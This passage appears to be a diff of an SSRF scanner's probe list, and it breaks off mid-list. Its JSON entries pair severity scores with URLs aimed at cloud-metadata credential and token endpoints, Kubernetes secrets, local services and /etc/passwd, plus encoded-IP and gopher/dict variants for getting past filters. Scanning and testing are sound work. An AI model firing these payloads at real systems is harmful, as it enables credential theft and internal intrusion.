@@ -1,71 +1,946 @@
 [
-  {"name": "aws_imds_v1",          "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/latest/meta-data/",                                        "matcher": "(ami-id|instance-id|iam/)"},
-  {"name": "aws_imds_iam",         "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",              "matcher": "[A-Za-z0-9_-]+"},
-  {"name": "aws_imds_userdata",    "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/latest/user-data/",                                       "matcher": "(#!/|#cloud-config|export\\s+)"},
-  {"name": "aws_imds_v1_alt",      "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://[::ffff:169.254.169.254]/latest/meta-data/",                              "matcher": "(ami-id|instance-id)"},
-  {"name": "aws_imds_dec",         "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://2852039166/latest/meta-data/",                                            "matcher": "(ami-id|instance-id)"},
-  {"name": "aws_imds_hex",         "category": "aws-imds",       "severity": "CRITICAL", "cvss": "9.8", "url": "http://0xa9fea9fe/latest/meta-data/",                                            "matcher": "(ami-id|instance-id)"},
-
-  {"name": "gcp_metadata_root",    "category": "gcp-metadata",   "severity": "CRITICAL", "cvss": "9.8", "url": "http://metadata.google.internal/computeMetadata/v1/",                            "matcher": "(/instance/|/project/)"},
-  {"name": "gcp_metadata_token",   "category": "gcp-metadata",   "severity": "CRITICAL", "cvss": "9.8", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "matcher": "(access_token|token_type)"},
-  {"name": "gcp_metadata_id",      "category": "gcp-metadata",   "severity": "HIGH",     "cvss": "7.5", "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",          "matcher": "[a-z][-a-z0-9]+"},
-  {"name": "gcp_metadata_ip",      "category": "gcp-metadata",   "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/computeMetadata/v1/",                                     "matcher": "(/instance/|/project/)"},
-
-  {"name": "azure_imds_v1",        "category": "azure-imds",     "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",                "matcher": "(compute|network|location)"},
-  {"name": "azure_imds_token",     "category": "azure-imds",     "severity": "CRITICAL", "cvss": "9.8", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "matcher": "(access_token|expires_in)"},
-
-  {"name": "do_metadata",          "category": "do-metadata",    "severity": "HIGH",     "cvss": "7.5", "url": "http://169.254.169.254/metadata/v1/",                                            "matcher": "(droplet_id|region|hostname)"},
-  {"name": "do_metadata_userdata", "category": "do-metadata",    "severity": "HIGH",     "cvss": "7.5", "url": "http://169.254.169.254/metadata/v1/user-data",                                   "matcher": "(#!/|#cloud-config)"},
-
-  {"name": "oracle_imds",          "category": "oracle-imds",    "severity": "HIGH",     "cvss": "7.5", "url": "http://169.254.169.254/opc/v1/instance/",                                        "matcher": "(displayName|shape|compartmentId)"},
-
-  {"name": "alibaba_imds",         "category": "alibaba-imds",   "severity": "HIGH",     "cvss": "7.5", "url": "http://100.100.100.200/latest/meta-data/",                                       "matcher": "(instance-id|region-id)"},
-
-  {"name": "tencent_imds",         "category": "tencent-imds",   "severity": "HIGH",     "cvss": "7.5", "url": "http://metadata.tencentyun.com/latest/meta-data/",                               "matcher": "(instance-id|region)"},
-
-  {"name": "ibm_imds",             "category": "ibm-imds",       "severity": "HIGH",     "cvss": "7.5", "url": "http://169.254.169.254/metadata/v1/instance",                                    "matcher": "(id|name|profile|zone)"},
-
-  {"name": "k8s_api_root",         "category": "kubelet",        "severity": "CRITICAL", "cvss": "9.1", "url": "https://kubernetes.default.svc/api/v1/",                                         "matcher": "(\"kind\":\\s*\"APIResourceList\"|\"resources\":)"},
-  {"name": "k8s_token",            "category": "kubelet",        "severity": "CRITICAL", "cvss": "9.8", "url": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",                     "matcher": "ey[A-Za-z0-9_-]+\\.ey"},
-  {"name": "k8s_namespaces",       "category": "kubelet",        "severity": "HIGH",     "cvss": "7.5", "url": "https://kubernetes.default.svc/api/v1/namespaces",                               "matcher": "(\"kind\":\\s*\"NamespaceList\")"},
-  {"name": "k8s_pods",             "category": "kubelet",        "severity": "HIGH",     "cvss": "7.5", "url": "https://kubernetes.default.svc/api/v1/pods",                                     "matcher": "(\"kind\":\\s*\"PodList\")"},
-  {"name": "kubelet_default",      "category": "kubelet",        "severity": "HIGH",     "cvss": "7.5", "url": "https://127.0.0.1:10250/pods",                                                  "matcher": "(\"kind\":\\s*\"PodList\")"},
-  {"name": "kubelet_metrics",      "category": "kubelet",        "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:10255/metrics",                                                "matcher": "# HELP"},
-
-  {"name": "docker_socket",        "category": "docker-api",     "severity": "CRITICAL", "cvss": "9.8", "url": "http://localhost:2375/containers/json",                                          "matcher": "\"Id\":\\s*\"[a-f0-9]+\""},
-  {"name": "docker_socket_tls",    "category": "docker-api",     "severity": "CRITICAL", "cvss": "9.8", "url": "https://localhost:2376/containers/json",                                         "matcher": "\"Id\":\\s*\"[a-f0-9]+\""},
-  {"name": "docker_info",          "category": "docker-api",     "severity": "HIGH",     "cvss": "7.5", "url": "http://localhost:2375/info",                                                    "matcher": "(\"Containers\":|\"Images\":)"},
-
-  {"name": "localhost_app",        "category": "localhost",      "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:3000/",                                                        "matcher": ".+"},
-  {"name": "localhost_8080",       "category": "localhost",      "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:8080/",                                                        "matcher": ".+"},
-  {"name": "localhost_9090",       "category": "localhost",      "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:9090/",                                                        "matcher": ".+"},
-  {"name": "localhost_5000",       "category": "localhost",      "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:5000/",                                                        "matcher": ".+"},
-  {"name": "localhost_redis",      "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:6379/",                                                        "matcher": "(\\+OK|\\$\\d+|\\*\\d+)"},
-  {"name": "localhost_memcached",  "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:11211/",                                                       "matcher": "(STAT|VERSION)"},
-  {"name": "localhost_es",         "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:9200/_cluster/health",                                         "matcher": "(\"cluster_name\"|\"status\":)"},
-  {"name": "localhost_es_alt",     "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:9200/_cat/indices",                                            "matcher": "(open|close|green|yellow|red)"},
-  {"name": "localhost_kibana",     "category": "localhost",      "severity": "MEDIUM",   "cvss": "5.3", "url": "http://127.0.0.1:5601/",                                                        "matcher": "(Kibana|kbn-)"},
-  {"name": "localhost_jenkins",    "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:8080/api/json",                                                "matcher": "(\"jobs\"|\"_class\":\\s*\"hudson)"},
-  {"name": "localhost_mongo",      "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:27017/",                                                       "matcher": "It looks like you are trying to access MongoDB"},
-  {"name": "localhost_couchdb",    "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:5984/",                                                        "matcher": "(\"couchdb\":\\s*\"Welcome\")"},
-  {"name": "localhost_rabbit",     "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:15672/api/overview",                                           "matcher": "(rabbitmq_version|management_version)"},
-  {"name": "localhost_consul",     "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:8500/v1/agent/self",                                           "matcher": "(\"Config\"|\"DebugConfig\")"},
-  {"name": "localhost_vault",      "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:8200/v1/sys/health",                                           "matcher": "(\"initialized\"|\"sealed\"|\"standby\")"},
-  {"name": "localhost_etcd",       "category": "localhost",      "severity": "HIGH",     "cvss": "7.5", "url": "http://127.0.0.1:2379/v2/keys/",                                                "matcher": "(\"action\":\\s*\"get\"|errorCode)"},
-
-  {"name": "internal_10",          "category": "internal-net",   "severity": "MEDIUM",   "cvss": "5.3", "url": "http://10.0.0.1/",                                                              "matcher": ".+"},
-  {"name": "internal_172",         "category": "internal-net",   "severity": "MEDIUM",   "cvss": "5.3", "url": "http://172.16.0.1/",                                                            "matcher": ".+"},
-  {"name": "internal_192",         "category": "internal-net",   "severity": "MEDIUM",   "cvss": "5.3", "url": "http://192.168.0.1/",                                                           "matcher": ".+"},
-  {"name": "internal_ipv6",        "category": "internal-net",   "severity": "MEDIUM",   "cvss": "5.3", "url": "http://[fc00::1]/",                                                             "matcher": ".+"},
-  {"name": "internal_link_local",  "category": "internal-net",   "severity": "MEDIUM",   "cvss": "5.3", "url": "http://[fe80::1]/",                                                             "matcher": ".+"},
-
-  {"name": "schema_file",          "category": "schema-bypass",  "severity": "HIGH",     "cvss": "7.5", "url": "file:///etc/passwd",                                                            "matcher": "root:[x*]?:0:0"},
-  {"name": "schema_file_windows",  "category": "schema-bypass",  "severity": "HIGH",     "cvss": "7.5", "url": "file:///C:/Windows/win.ini",                                                    "matcher": "\\[fonts\\]"},
-  {"name": "schema_gopher",        "category": "schema-bypass",  "severity": "HIGH",     "cvss": "7.5", "url": "gopher://127.0.0.1:6379/_INFO",                                                 "matcher": "(redis_version|\\+OK)"},
-  {"name": "schema_dict",          "category": "schema-bypass",  "severity": "HIGH",     "cvss": "7.5", "url": "dict://127.0.0.1:11211/stats",                                                 "matcher": "(STAT|VERSION)"},
-  {"name": "schema_ldap",          "category": "schema-bypass",  "severity": "MEDIUM",   "cvss": "5.3", "url": "ldap://127.0.0.1:389/",                                                         "matcher": ".+"},
-  {"name": "schema_sftp",          "category": "schema-bypass",  "severity": "MEDIUM",   "cvss": "5.3", "url": "sftp://127.0.0.1/",                                                             "matcher": ".+"},
-
-  {"name": "dns_rebind_imds",      "category": "dns-rebind",     "severity": "HIGH",     "cvss": "7.5", "url": "http://169.254.169.254.nip.io/latest/meta-data/",                                "matcher": "(ami-id|instance-id)"},
-  {"name": "dns_rebind_localhost", "category": "dns-rebind",     "severity": "HIGH",     "cvss": "7.5", "url": "http://localtest.me/",                                                          "matcher": ".+"}
+  {
+    "name": "aws_imds_root",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_iam",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "matcher": "[A-Za-z0-9_-]+"
+  },
+  {
+    "name": "aws_imds_iam_role",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "matcher": "(AccessKeyId|SecretAccessKey|Token)"
+  },
+  {
+    "name": "aws_imds_userdata",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/user-data/",
+    "matcher": "(#!/|#cloud-config|export\\s+)"
+  },
+  {
+    "name": "aws_imds_hostname",
+    "category": "aws-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/latest/meta-data/hostname",
+    "matcher": "[a-z0-9.-]+\\.compute"
+  },
+  {
+    "name": "aws_imds_token_v2",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/api/token",
+    "matcher": "[A-Za-z0-9+/=]{20,}"
+  },
+  {
+    "name": "aws_imds_az",
+    "category": "aws-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
+    "matcher": "[a-z]{2}-[a-z]+-\\d[a-z]"
+  },
+  {
+    "name": "aws_imds_ipv6_mapped",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_decimal",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://2852039166/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_hex",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://0xa9fea9fe/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_octal",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://0251.0376.0251.0376/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_dotted_hex",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_dotted_oct",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://0251.0376.43518/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_short",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/latest/meta-data",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_enclosed_alt",
+    "category": "aws-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://425.510.425.510/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "aws_imds_ecs",
+    "category": "aws-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.170.2/v2/credentials/",
+    "matcher": "(AccessKeyId|RoleArn)"
+  },
+  {
+    "name": "aws_imds_nip",
+    "category": "aws-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254.nip.io/latest/meta-data/",
+    "matcher": "(ami-id|instance-id|iam/|hostname|local-ipv4)"
+  },
+  {
+    "name": "gcp_metadata_root",
+    "category": "gcp-metadata",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://metadata.google.internal/computeMetadata/v1/",
+    "matcher": "(/instance/|/project/)"
+  },
+  {
+    "name": "gcp_metadata_token",
+    "category": "gcp-metadata",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "matcher": "(access_token|token_type)"
+  },
+  {
+    "name": "gcp_metadata_email",
+    "category": "gcp-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
+    "matcher": "[a-z0-9-]+@[a-z0-9-]+"
+  },
+  {
+    "name": "gcp_metadata_id",
+    "category": "gcp-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+    "matcher": "[a-z][-a-z0-9]+"
+  },
+  {
+    "name": "gcp_metadata_ip",
+    "category": "gcp-metadata",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/computeMetadata/v1/",
+    "matcher": "(/instance/|/project/)"
+  },
+  {
+    "name": "gcp_metadata_recursive",
+    "category": "gcp-metadata",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json",
+    "matcher": "(\"instance\"|\"project\")"
+  },
+  {
+    "name": "gcp_metadata_ssh",
+    "category": "gcp-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
+    "matcher": "(ssh-rsa|ssh-ed25519)"
+  },
+  {
+    "name": "gcp_metadata_short",
+    "category": "gcp-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://metadata.google.internal/0.1/meta-data/",
+    "matcher": "(/instance/|service-accounts)"
+  },
+  {
+    "name": "azure_imds_instance",
+    "category": "azure-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "matcher": "(compute|network|location)"
+  },
+  {
+    "name": "azure_imds_token",
+    "category": "azure-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    "matcher": "(access_token|expires_in)"
+  },
+  {
+    "name": "azure_imds_token_vault",
+    "category": "azure-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
+    "matcher": "(access_token|expires_in)"
+  },
+  {
+    "name": "azure_imds_compute",
+    "category": "azure-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+    "matcher": "(vmId|subscriptionId|resourceGroupName)"
+  },
+  {
+    "name": "azure_imds_scheduledevents",
+    "category": "azure-imds",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
+    "matcher": "(DocumentIncarnation|Events)"
+  },
+  {
+    "name": "do_metadata_root",
+    "category": "do-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/metadata/v1/",
+    "matcher": "(droplet_id|region|hostname)"
+  },
+  {
+    "name": "do_metadata_userdata",
+    "category": "do-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/metadata/v1/user-data",
+    "matcher": "(#!/|#cloud-config)"
+  },
+  {
+    "name": "do_metadata_id",
+    "category": "do-metadata",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://169.254.169.254/metadata/v1/id",
+    "matcher": "\\d+"
+  },
+  {
+    "name": "do_metadata_json",
+    "category": "do-metadata",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/metadata/v1.json",
+    "matcher": "(\"droplet_id\"|\"region\")"
+  },
+  {
+    "name": "oracle_imds_v1",
+    "category": "oracle-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/opc/v1/instance/",
+    "matcher": "(displayName|shape|compartmentId)"
+  },
+  {
+    "name": "oracle_imds_v2",
+    "category": "oracle-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/opc/v2/instance/",
+    "matcher": "(displayName|shape|compartmentId)"
+  },
+  {
+    "name": "oracle_imds_identity",
+    "category": "oracle-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/opc/v2/identity/cert.pem",
+    "matcher": "-----BEGIN CERTIFICATE-----"
+  },
+  {
+    "name": "alibaba_imds_root",
+    "category": "alibaba-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://100.100.100.200/latest/meta-data/",
+    "matcher": "(instance-id|region-id)"
+  },
+  {
+    "name": "alibaba_imds_ram",
+    "category": "alibaba-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+    "matcher": "[A-Za-z0-9_-]+"
+  },
+  {
+    "name": "alibaba_imds_userdata",
+    "category": "alibaba-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://100.100.100.200/latest/user-data",
+    "matcher": "(#!/|#cloud-config)"
+  },
+  {
+    "name": "tencent_imds_root",
+    "category": "tencent-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://metadata.tencentyun.com/latest/meta-data/",
+    "matcher": "(instance-id|region)"
+  },
+  {
+    "name": "tencent_imds_cam",
+    "category": "tencent-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
+    "matcher": "[A-Za-z0-9_-]+"
+  },
+  {
+    "name": "ibm_imds_instance",
+    "category": "ibm-imds",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://169.254.169.254/metadata/v1/instance",
+    "matcher": "(id|name|profile|zone)"
+  },
+  {
+    "name": "ibm_imds_token",
+    "category": "ibm-imds",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://169.254.169.254/instance_identity/v1/token",
+    "matcher": "(access_token|token)"
+  },
+  {
+    "name": "k8s_api_root",
+    "category": "kubelet",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "url": "https://kubernetes.default.svc/api/v1/",
+    "matcher": "(\"kind\":\\s*\"APIResourceList\"|\"resources\":)"
+  },
+  {
+    "name": "k8s_token_file",
+    "category": "kubelet",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+    "matcher": "ey[A-Za-z0-9_-]+\\.ey"
+  },
+  {
+    "name": "k8s_namespaces",
+    "category": "kubelet",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "https://kubernetes.default.svc/api/v1/namespaces",
+    "matcher": "(\"kind\":\\s*\"NamespaceList\")"
+  },
+  {
+    "name": "k8s_pods",
+    "category": "kubelet",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "https://kubernetes.default.svc/api/v1/pods",
+    "matcher": "(\"kind\":\\s*\"PodList\")"
+  },
+  {
+    "name": "k8s_secrets",
+    "category": "kubelet",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "https://kubernetes.default.svc/api/v1/secrets",
+    "matcher": "(\"kind\":\\s*\"SecretList\")"
+  },
+  {
+    "name": "k8s_api_ip",
+    "category": "kubelet",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "url": "https://10.96.0.1/api/v1/",
+    "matcher": "(\"kind\":\\s*\"APIResourceList\")"
+  },
+  {
+    "name": "kubelet_pods",
+    "category": "kubelet",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "https://127.0.0.1:10250/pods",
+    "matcher": "(\"kind\":\\s*\"PodList\")"
+  },
+  {
+    "name": "kubelet_metrics",
+    "category": "kubelet",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:10255/metrics",
+    "matcher": "# HELP"
+  },
+  {
+    "name": "kubelet_runningpods",
+    "category": "kubelet",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "https://127.0.0.1:10250/runningpods/",
+    "matcher": "(\"kind\":\\s*\"PodList\"|Pod)"
+  },
+  {
+    "name": "kubelet_stats",
+    "category": "kubelet",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:10255/stats/summary",
+    "matcher": "(\"node\"|\"cpu\"|\"memory\")"
+  },
+  {
+    "name": "docker_containers",
+    "category": "docker-api",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "http://localhost:2375/containers/json",
+    "matcher": "\"Id\":\\s*\"[a-f0-9]+\""
+  },
+  {
+    "name": "docker_containers_tls",
+    "category": "docker-api",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "url": "https://localhost:2376/containers/json",
+    "matcher": "\"Id\":\\s*\"[a-f0-9]+\""
+  },
+  {
+    "name": "docker_info",
+    "category": "docker-api",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://localhost:2375/info",
+    "matcher": "(\"Containers\":|\"Images\":)"
+  },
+  {
+    "name": "docker_version",
+    "category": "docker-api",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://localhost:2375/version",
+    "matcher": "(\"ApiVersion\"|\"GitCommit\")"
+  },
+  {
+    "name": "docker_images",
+    "category": "docker-api",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://localhost:2375/images/json",
+    "matcher": "(\"RepoTags\"|\"Id\")"
+  },
+  {
+    "name": "docker_socket_unix",
+    "category": "docker-api",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:2375/_ping",
+    "matcher": "OK"
+  },
+  {
+    "name": "localhost_127",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_word",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://localhost/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_0",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://0.0.0.0/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_0_short",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://0/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_decimal",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://2130706433/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_hex",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://0x7f000001/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_octal",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://0177.0.0.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_octal_full",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://0177.0000.0000.0001/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_ipv6",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://[::1]/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_ipv6_mapped",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://[::ffff:127.0.0.1]/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_subdomain_trick",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1.nip.io/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_127_1",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.1/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_app_3000",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:3000/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_8080",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:8080/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_9090",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:9090/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_5000",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:5000/",
+    "matcher": ".+"
+  },
+  {
+    "name": "localhost_redis",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:6379/",
+    "matcher": "(\\+OK|\\$\\d+|\\*\\d+)"
+  },
+  {
+    "name": "localhost_memcached",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:11211/",
+    "matcher": "(STAT|VERSION)"
+  },
+  {
+    "name": "localhost_es_health",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:9200/_cluster/health",
+    "matcher": "(\"cluster_name\"|\"status\":)"
+  },
+  {
+    "name": "localhost_es_indices",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:9200/_cat/indices",
+    "matcher": "(open|close|green|yellow|red)"
+  },
+  {
+    "name": "localhost_kibana",
+    "category": "localhost",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "url": "http://127.0.0.1:5601/",
+    "matcher": "(Kibana|kbn-)"
+  },
+  {
+    "name": "localhost_jenkins",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:8080/api/json",
+    "matcher": "(\"jobs\"|\"_class\":\\s*\"hudson)"
+  },
+  {
+    "name": "localhost_mongo",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:27017/",
+    "matcher": "It looks like you are trying to access MongoDB"
+  },
+  {
+    "name": "localhost_couchdb",
+    "category": "localhost",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "url": "http://127.0.0.1:5984/",
+    "matcher": "(\"couchdb\":\\s*\"Welcome\")"
